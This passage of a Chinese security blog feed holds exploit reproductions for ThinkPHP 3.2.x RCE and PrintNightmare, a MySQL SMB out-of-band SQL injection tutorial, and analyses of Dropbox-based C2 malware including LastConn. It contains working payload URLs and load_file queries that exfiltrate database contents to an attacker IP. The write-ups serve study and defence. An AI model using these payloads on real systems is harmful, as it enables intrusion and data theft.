href="http://m.windowsupdatesupport.org" target="_blank" rel="noopener">http://m.windowsupdatesupport.org</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;参考链接：&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;amp;mi</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP3.2.x RCE漏洞复现</title>
    <link href="http://422926799.github.io/posts/94587123.html"/>
    <id>http://422926799.github.io/posts/94587123.html</id>
    <published>2021-07-12T09:32:20.000Z</published>
    <updated>2021-07-12T09:46:31.421Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://z3.ax1x.com/2021/07/12/WiotOO.jpg" alt=""></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ThinkPHP3.2的远程代码执行漏洞。该漏洞是在受影响的版本中，业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>windows 10phpstudy 5.6Thinkphp 3.2.3完整版</code></pre><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>demo:</p><blockquote><p>demo代码说明：如果需要测试请把demo代码放入对应位置,代码位置：\Application\Home\Controller\IndexController.class.php,因为程序要进入模板渲染方法方法中，所以需要创建对应的模板文件，内容随意，模板文件位置：Application\Home\View\Index (View没有Index文件夹需要自己创建)</p></blockquote><pre><code class="php">&lt;?phpnamespace Home\Controller;use Think\Controller;class IndexController extends Controller {    public function index($value=&#39;&#39;){        $this-&gt;assign($value);        $this-&gt;display();    }}</code></pre><p>利用步骤：</p><pre><code>1. 创建log2. 包含log</code></pre><p>创建log发送请求 注意，m=后面的code不要url编码，否则包含的时候会失败）</p><pre><code>http://127.0.0.1/index.php?m=--&gt;&lt;?=phpinfo();?&gt;</code></pre><p><img src="https://z3.ax1x.com/2021/07/12/WiTLxP.png" alt=""></p><p>包含log</p><pre><code>http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/21_07_12.log</code></pre><p><img src="https://z3.ax1x.com/2021/07/12/Wi7eZF.png" alt=""></p><p>Debug开启和关闭的路径不同:</p><pre><code>开启: Application\Runtime\Logs\Common\&lt;log&gt;关闭: Application\Runtime\Logs\Home\&lt;log&gt;</code></pre><h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>1.assign函数返回模板变量<br><img src="https://z3.ax1x.com/2021/07/12/Wi7GqO.png" alt=""></p><p>2.到display函数开始解析<br><img src="https://z3.ax1x.com/2021/07/12/Wi7NIH.png" alt=""></p><p>3.到达View.Class.php发现把payload传入到Hook::Listen函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7wRI.png" alt=""></p><p>4.进入循环在将payload传入self::exec函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7rsf.png" alt=""></p><p>5.调用Behavior\ParseTemplateBehavior类 (将log文件写入缓存php)<br><img src="https://z3.ax1x.com/2021/07/12/Wi7fWn.png" alt=""></p><p>6.调用fetch函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7IyV.png" alt=""></p><p>最后load函数加载<br><img src="https://z3.ax1x.com/2021/07/12/Wi77eU.png" alt=""></p><p>(不会描述，原文章描述的很好)</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ</a><br><a href="https://blog.csdn.net/cvper/article/details/66713909" target="_blank" rel="noopener">https://blog.csdn.net/cvper/article/details/66713909</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://z3.ax1x.com/2021/07/12/WiotOO.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;Th</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>某Dropbox c2分析</title>
    <link href="http://422926799.github.io/posts/e5369ead.html"/>
    <id>http://422926799.github.io/posts/e5369ead.html</id>
    <published>2021-07-03T13:44:16.000Z</published>
    <updated>2021-07-03T14:47:08.374Z</updated>
    
    <content type="html"><![CDATA[<p>样本地址：<a href="https://app.any.run/tasks/2cb3412f-cc9e-4164-8f9d-28aba9e6d681/" target="_blank" rel="noopener">https://app.any.run/tasks/2cb3412f-cc9e-4164-8f9d-28aba9e6d681/</a><br>x86 C++编写<br><img src="https://z3.ax1x.com/2021/07/03/RRQwnA.png" alt=""></p><p>该样本是个释放器，用于释放Dropbox的c2<br><img src="https://z3.ax1x.com/2021/07/03/RRQoNV.png" alt=""></p><p>首先搜索当前进程所在路径下的doc、xls、pdf。后缀文件，这三个后缀文件如果搜索到一个则打开<br><img src="https://z3.ax1x.com/2021/07/03/RRQH9U.png" alt=""></p><p>然后休眠2秒<br><img src="https://z3.ax1x.com/2021/07/03/RR88DH.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRQLjJ.png" alt=""></p><p>在C:\Users\Public释放名为spools.exe，最后执行<br><img src="https://z3.ax1x.com/2021/07/03/RR8aPP.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RR8d8f.png" alt=""></p><p>火绒剑动态监控：<br><img src="https://z3.ax1x.com/2021/07/03/RR8w28.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RR8DKg.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RR8zse.png" alt=""></p><p>Dropbox c2分析<br>沙盒执行：<a href="https://app.any.run/tasks/84bc039c-cefa-4369-b4ba-3ed1a254eb2c" target="_blank" rel="noopener">https://app.any.run/tasks/84bc039c-cefa-4369-b4ba-3ed1a254eb2c</a><br>注册一个窗口类调用sub_404F30函数<br><img src="https://z3.ax1x.com/2021/07/03/RRGFit.png" alt=""></p><p>该函数调用CreateThread创建线程执行<br><img src="https://z3.ax1x.com/2021/07/03/RRt2mF.png" alt=""></p><p>首先检查开机到现在启动的时间，如果该时间小于192000毫秒。则休眠102毫秒<br>然后获取计算机配置构造出要发送的json，进入死循环<br><img src="https://z3.ax1x.com/2021/07/03/RRtWTJ.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRt5f1.png" alt="计算机配置信息收集"></p><p>构造请求的json<br><img src="https://z3.ax1x.com/2021/07/03/RRtTl6.png" alt=""></p><p>v72+GetLocalTime最终拼接出来的json<br><img src="https://z3.ax1x.com/2021/07/03/RRNSpt.png" alt=""></p><p>IE请求构造<br><img src="https://z3.ax1x.com/2021/07/03/RRNF0g.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNn10.png" alt=""></p><p>在dropbox在给定的路径上创建一个文件夹<br><img src="https://z3.ax1x.com/2021/07/03/RRNucV.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNQnU.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNlBF.png" alt=""></p><p>获取远程的文件夹内容，获取后写入到C:\Users\Public\下的一个文件<br><img src="https://z3.ax1x.com/2021/07/03/RRNt91.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNUc6.png" alt=""></p><p>然后下面上传了一个文件，这里没分析出来是上传了什么<br><img src="https://z3.ax1x.com/2021/07/03/RRNoNj.png" alt=""></p><p>最后远程下载要执行的命令写入到txt，执行完成后上传。最后删除下载的文件<br><img src="https://z3.ax1x.com/2021/07/03/RRNHCn.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNXuT.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRUSUJ.png" alt=""></p><p>最后休眠102毫秒<br><img src="https://z3.ax1x.com/2021/07/03/RRUAKK.png" alt=""></p><p>IOC<br>释放器:0ee449ccbe2e7f413be85b627ca198ba<br>spools.exe md5:b6824c8cb1594e48a8f63d25066e1dde</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;样本地址：&lt;a href=&quot;https://app.any.run/tasks/2cb3412f-cc9e-4164-8f9d-28aba9e6d681/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://app.any.run/tasks/2</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-1675复现</title>
    <link href="http://422926799.github.io/posts/c257aa46.html"/>
    <id>http://422926799.github.io/posts/c257aa46.html</id>
    <published>2021-06-30T19:15:07.000Z</published>
    <updated>2021-06-30T19:28:26.845Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote><p>Windows Print Spooler 远程代码执行漏洞<br>CVE-2021-1675<br>安全漏洞<br>发布时间：2021 年 6 月 8 日 最后更新：2021 年 6 月 21 日<br>分配 CNA：<br>微软<br>MITRE CVE-2021-1675<br>CVSS：3.0 7.8 / 6.8</p></blockquote><p>影响范围:Windows Server 2012-Windows Server 2019</p><p>官方链接:<a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675</a></p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>Windows Server 2019<br>域控版本:Windows Server 2016<br><img src="https://z3.ax1x.com/2021/07/01/RDr0QU.png" alt=""></p><p>需一个普通的域用户<br><img src="https://z3.ax1x.com/2021/07/01/RDrdzT.png" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>目前有的exp一共有两个，一个是py的一个是cpp写的<br><a href="https://github.com/hayasec/PrintNightmare" target="_blank" rel="noopener">https://github.com/hayasec/PrintNightmare</a><br><a href="https://github.com/cube0x0/CVE-2021-1675" target="_blank" rel="noopener">https://github.com/cube0x0/CVE-2021-1675</a></p><p>至于第二个py的，我这impacket环境报错<br><img src="https://z3.ax1x.com/2021/07/01/RDraWV.png" alt=""></p><p>第一个PrintNightmare下载下来后需要改两个地方，第112行的驱动路径UNIDRV.DLL，需要手动确定位置<br><img src="https://z3.ax1x.com/2021/07/01/RDrByF.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/07/01/RDrDL4.png" alt=""></p><p>搜索有关old关键词的路径，替换为<code>C:\\Windows\\System32\\spool\\drivers\\x64\\%s</code>，一共有3处<br><img src="https://z3.ax1x.com/2021/07/01/RDrseJ.png" alt=""></p><p>msf或cs生成个x64的dll（填的驱动路径是amd64对应64位），丢到smb。smb需要可以匿名访问/或者直接丢虚拟机里本地路径也行<br>执行即可成功上线cs<br><img src="https://z3.ax1x.com/2021/07/01/RDryw9.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/07/01/RDrgF1.png" alt=""></p><p>这里还顺便踩了smb的坑，用自带的smb服务，不要用imapcket的smbserver.py。否则会报句柄错误</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Windows Print Spooler 远程代码执行漏洞&lt;br&gt;CVE-2021-1675&lt;b</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
    
  </entry>
  
  <entry>
    <title>mysql smb外带注入</title>
    <link href="http://422926799.github.io/posts/af61cc76.html"/>
    <id>http://422926799.github.io/posts/af61cc76.html</id>
    <published>2021-06-29T14:19:23.000Z</published>
    <updated>2021-06-29T14:28:09.743Z</updated>
    
    <content type="html"><![CDATA[<p>需求：secure_file_priv为空，目标系统为windows<br>smb设置如下：</p><pre><code>找到 security = user ， 旧版本将user 改为share，这里我用的新版本，需要在后面添加：map to guest = Bad User新设置一个smbsmb日志:/var/log/samba</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwuE9S.png" alt=""></p><p>smb外带注入与DNS外带注入比较:</p><ol><li>smb外带注入 可以一次性提交更大长度的字符，经测试长度在120是没有问题的，而dns前缀最多是63个字符。而且对特殊字符的兼容性比较好，目前测试发现 *是不行的，其他还有待fuzz。</li><li>smb外带注入不依赖于dns，可以绕过目前流量监测设备对异常域名前缀的捕获，可以直接使用ip，不需要dns请求。</li></ol><p>构造sql语句：</p><pre><code>select load_file(concat(&quot;\\\\&lt;IP&gt;\\&quot;,(SQL语句),&quot;\\xxx&quot;))为了方便从log里提取查询的内容，可以构造如下语句select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,database(),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwuJc4.png" alt=""></p><p>查询当前数据库里的表</p><pre><code>1. 使用limit2. substring截断</code></pre><p>使用limit请先获取总共的表数</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select count(table_name) from information_schema.tables where table_schema=database()),&quot;]\\1.txt&quot;));</code></pre><p>再用limit逐个查询</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwKS8U.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/29/RwKp2F.png" alt=""></p><p>substring截断<br>截断到120字符串即可</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,120)),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwKAV1.png" alt=""></p><p>还有另外种方法就是利用smb获取ntlm hash，适用于知道目标一定的凭证。利用responder获取ntlm v2然后爆破<br><img src="https://z3.ax1x.com/2021/06/29/RwKUxg.png" alt=""></p><p>参考链接:<a href="http://moonslow.com/article/smb_sql_injection" target="_blank" rel="noopener">http://moonslow.com/article/smb_sql_injection</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;需求：secure_file_priv为空，目标系统为windows&lt;br&gt;smb设置如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;找到 security = user ， 旧版本将user 改为share，这里我用的新版本，需要在后面添加：
map to guest = Bad </summary>
      
    
    
    
    
    <category term="Writing" scheme="http://422926799.github.io/tags/Writing/"/>
    
  </entry>
  
  <entry>
    <title>LastConn 样本简陋分析</title>
    <link href="http://422926799.github.io/posts/519d2f5e.html"/>
    <id>http://422926799.github.io/posts/519d2f5e.html</id>
    <published>2021-06-19T17:35:48.000Z</published>
    <updated>2021-06-19T17:55:09.539Z</updated>
    
    <content type="html"><![CDATA[<h2 id="事件来源"><a href="#事件来源" class="headerlink" title="事件来源"></a>事件来源</h2><p>事件来源：<a href="https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east" target="_blank" rel="noopener">https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>由.NET开发<br><img src="https://z3.ax1x.com/2021/06/20/Rimgyj.png" alt=""></p><p>使用混淆器混淆过，de4dot 也无法完全反混淆，但它能够清除一些混淆<br>完全混淆：<br><img src="https://z3.ax1x.com/2021/06/20/Rim2Os.png" alt=""></p><p>部分混淆清除后:<br><img src="https://z3.ax1x.com/2021/06/20/RimWmn.png" alt=""></p><p>入口点</p><pre><code class="c#">private static void LsfApkF4M(){            Application.EnableVisualStyles(); //启用视觉样式            if (Program.nigDBMdtyE5deZClpF != null)            {            }            Application.SetCompatibleTextRenderingDefault(false); //在应用程序范围内设置控件显示文本的默认方式(true使用GDI+方式显示文本|false使用GDI方式显示文本.)            if (Program.V9yJ8yp9ahRYqnZDsG())  //Program.nigDBMdtyE5deZClpF == null            {                w4X4wl9MxwlqqYZEne.cBFhC9cq2dv3Z();                if (Program.nigDBMdtyE5deZClpF == null)                {                    Application.Run(new Form1());                }            }}</code></pre><p>进入到cBFhC9cq2dv3Z函数（判断当前时间减去 2021/6/16/时间戳判断是否大于14天）<br><img src="https://z3.ax1x.com/2021/06/20/Rim5kV.png" alt=""></p><p>大于或等于14天，在 2021-06-16 之后 14 天不能运行，过了这一步检测。进入Form1函数<br><img src="https://z3.ax1x.com/2021/06/20/RimIYT.png" alt=""></p><p>获取主机名+当前用户名<br><img src="https://z3.ax1x.com/2021/06/20/RimofU.png" alt=""></p><p>用户路径的临时文件夹路径获取<br><img src="https://z3.ax1x.com/2021/06/20/Rim7pF.png" alt=""></p><p>检查是否有域的存在<br><img src="https://z3.ax1x.com/2021/06/20/RimHl4.png" alt=""></p><p>获取系统制造商名称<br><img src="https://z3.ax1x.com/2021/06/20/Rimb6J.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/20/RimqX9.png" alt=""></p><p>解密资源文件里无名的资源<br><img src="https://z3.ax1x.com/2021/06/20/RimOmR.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/20/RimX01.png" alt=""></p><p>经过解密得到的为一份配置文件<br><img src="https://z3.ax1x.com/2021/06/20/RimztK.png" alt=""></p><pre><code>txt_Totime=60 //超时时间@txt_Ftime=50@txt_FristTimeConn=45@txt_PathDir=C:\Users\Public\Downloads //下载存放路径@txt_PassRar=1D1VQB4G8Q //压缩包解压密码@txt_Mutex=NVQAGGMV22CY37LNUO9T5CZVS@txt_KeyPath=SOFTWARE\Box@txt_LastConn=LastConn.txt@txt_ShellCode=ShellCode.txt@txt_ListFile=ListFile.txt@txt_isdownload=isdownload.txt@txt_FileToDown=FileToDown.txt@txt_TokenRunOne=O1P6jtSegunFJIAAAAAAAAAAS-BcSjDEdrK0SsV7BAHes97oBWke06Lhg8ThncuyCCy@txt_FileName=Viewfile //下载的压缩包名@txt_MyToken=O1PWT9LGL1As7EAAAAAAAAAAe6Oc-OILc7Y0SU9OIAFll1nElPBz_uE467zscqimYfd@txt_FileOpen=news.doc //诱饵文档@txt_Setting=Setting</code></pre><p>打开注册表路径HKEY_CURRENT_USER\SOFTWARE\Box，如果不存在则创建。然后从该路径读取名为OneFile的键值名称，如果不存在会退出进程，存在则进入到yExgOgDEb函数调用<br><img src="https://z3.ax1x.com/2021/06/20/Rin9pD.png" alt=""></p><p>先返回系统的语言<br><img src="https://z3.ax1x.com/2021/06/20/RinC1e.png" alt=""></p><p>返回系统版本信息<br><img src="https://z3.ax1x.com/2021/06/20/RinP6H.png" alt=""></p><p>返回一系列信息，然后上传到远端，利用Dropbox API 下载Viewfile.rar<br>利用rar命令行解压压缩包<br><img src="https://z3.ax1x.com/2021/06/20/RiniXd.png" alt=""></p><p>根据原文的报告，会从此处下载<br><img src="https://z3.ax1x.com/2021/06/20/RinA0I.png" alt=""></p><blockquote><p>第四个也是最后一个能力是命令处理。“txt_FileToDown”文件是使用“txt_Setting”文件中收到的身份验证令牌从 Dropbox 下载的。如果有任何命令要执行，该文件将包含换行符分隔的“<command>=<command arguments="">”条目。命令包括：<br>DFileDrop – 下载并执行托管在恶意软件 Dropbox 上的文件<br>DFromUrl – 下载并执行托管在 URL 上的文件<br>Cmd – 执行 cmd.exe 命令并通过“txt_ShellCode”文件将结果发送回恶意软件的 Dropbox<br>Powershell – 类似于“Cmd”，但适用于 Powershell<br>WMIC - 类似于“Cmd”，但用于 WMIC<br>ListFile – 获取指定的文件列表并将结果通过“txt_ListFile”文件发送回恶意软件的 Dropbox<br>UploadFiles – 在恶意软件的 Dropbox 上创建文件夹并将指定的文件上传到其中<br>屏幕截图 – 截取屏幕截图并上传到恶意软件的 Dropbox<br>GetIP – 通过 hxxps://api.ipify.org 获取 IP 地址并上传到恶意软件的 Dropbox<br>执行命令后，其条目将从“txt_FileToDown”文件中删除，并将该文件重新上传到恶意软件的 Dropbox。   </p></blockquote><p>该杨本所有混淆字符串解密：<a href="https://github.com/EmergingThreats/threatresearch/blob/master/LastConn/decrypted_strs.txt" target="_blank" rel="noopener">https://github.com/EmergingThreats/threatresearch/blob/master/LastConn/decrypted_strs.txt</a><br>沙盒链接：<a href="https://www.hybrid-analysis.com/sample/cb76a31e0e3759721290ea00ad65d2c194adceb9d77907e97159d82ee0311dde/60cad3c23992d956906e976a" target="_blank" rel="noopener">https://www.hybrid-analysis.com/sample/cb76a31e0e3759721290ea00ad65d2c194adceb9d77907e97159d82ee0311dde/60cad3c23992d956906e976a</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>混淆的cs，配合Dropbox做c2是个不错的选择</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;事件来源&quot;&gt;&lt;a href=&quot;#事件来源&quot; class=&quot;headerlink&quot; title=&quot;事件来源&quot;&gt;&lt;/a&gt;事件来源&lt;/h2&gt;&lt;p&gt;事件来源：&lt;a href=&quot;https://www.proofpoint.com/us/blog/threat-insigh</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
</feed>
